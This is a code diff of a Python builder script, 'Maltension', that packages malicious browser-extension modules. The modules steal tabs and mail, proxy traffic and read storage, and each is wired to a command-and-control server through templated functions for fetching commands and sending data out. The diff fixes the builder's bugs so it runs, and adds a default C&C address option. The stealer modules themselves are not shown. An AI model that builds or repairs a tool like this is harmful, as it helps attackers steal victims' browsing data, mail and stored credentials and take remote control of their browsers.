@@ -1,15 +1,17 @@
-from malmodules import tabs_stealer, mail_stealer, proxy_urls, storage_stealing
+# from modules import tabs_stealer, mail_stealer, proxy_urls, storage_stealing
 import argparse
 import os
 import sys
 
 
+MODULES_DIR = 'modules'
+
 modules_dict = {
+	"cc": 'cc.js', # Always inside & First, C&C communication.
 	"tabs": 'tabs.js',
 	"mail": 'mail.js',
 	"proxy": 'proxy.js',
 	"fs": 'fs.js'
-	"cc": 'cc.js' # Always inside, C&C communication.
 }
 
 modules_args = {
@@ -19,14 +21,14 @@ modules_args = {
 	# This is here to make the following lines work:
 	# let getCmds = {{CC_GET_CMDS_FN}}; let sendData = {{CC_SEND_DATA_FN}};
 	b'{{CC_GET_CMDS_FN}}': b'getCmds', # function name is constant, defined in cc.js
-	b'{{CC_SEND_DATA_FN}}': b'sendData' # function name is constant, defined in cc.js
+	b'{{CC_SEND_DATA_FN}}': b'sendData', # function name is constant, defined in cc.js
 	b'{{CC_EXECUTED_CMD_FN}}': b'executedCmd' # function name is constant, defined in cc.js
 }
 
 def main():
 	# Verify arguments.
 	parser = argparse.ArgumentParser(description='Maltension')
-	parser.add_argument('-m', '--modules', dest='modules', nargs='+', 
+	parser.add_argument('-m', '--modules', dest='modules', required=True, nargs='+', 
 						help='modules list to place, can be either of: {tabs, mail, proxy, fs}')
 	parser.add_argument('-o', '--odir', dest='odir', default='malty',
 						help='Output directory to place files.')
@@ -36,22 +38,27 @@ def main():
 						'*If the format is "ext", ofile is required & will be used as output directory path.')
 	parser.add_argument('-s', '--ccserver', dest='ccserver', default='127.0.0.1:8080',
 						help='IP:PORT of the C&C server to use.')
+	args = parser.parse_args()
+	compile(args)
 
 
 def fill_modules_args(args):
-	modules_args[b'{{CC_SERVER_IP_ADDR}}'] = args.ccserver
+	modules_args[b'{{CC_SERVER_IP_ADDR}}'] = args.ccserver.encode('utf-8')
 
 def get_module(mpath, args):
-	d = open(mpath, 'rb').read()
+	d = open(os.path.join(MODULES_DIR, mpath), 'rb').read()
+	print(d)
 	for marg in modules_args:
+		print(marg, modules_args[marg])
 		d = d.replace(marg, modules_args[marg])
 	return d
 
 def compile(args):
 	opath = args.odir
 	# 1. Check if ouput existing.
-	if os.path.exists(opath) or sys.path.isdir(opath):
-		print("[!] Error, output path already exists.")
+	print(args)
+	if os.path.exists(opath) or os.path.isdir(opath):
+		print("[!] Error, output path %s already exists." % opath)
 		return
 	# 2. Generate output directory
 	os.mkdir(opath)
@@ -72,7 +79,7 @@ def compile(args):
 	# 5. JS total file generation.
 	js_injected = b''
 	for mu in mods_used:
-		js_injected += b'\n{\n' + get_module(args=args) + b'\n};\n'
+		js_injected += b'\n{\n' + get_module(mu, args=args) + b'\n};\n'
 		js_injected += b'; /* Modules seperator */ ; \r\n'
 
 	# 6. Manifest generation (if required).
@@ -118,3 +125,5 @@ def compile(args):
 		print('Writing JS...')
 		open(ofile, 'wb').write(js_injected)
 		print('Done All!')
+
+main()
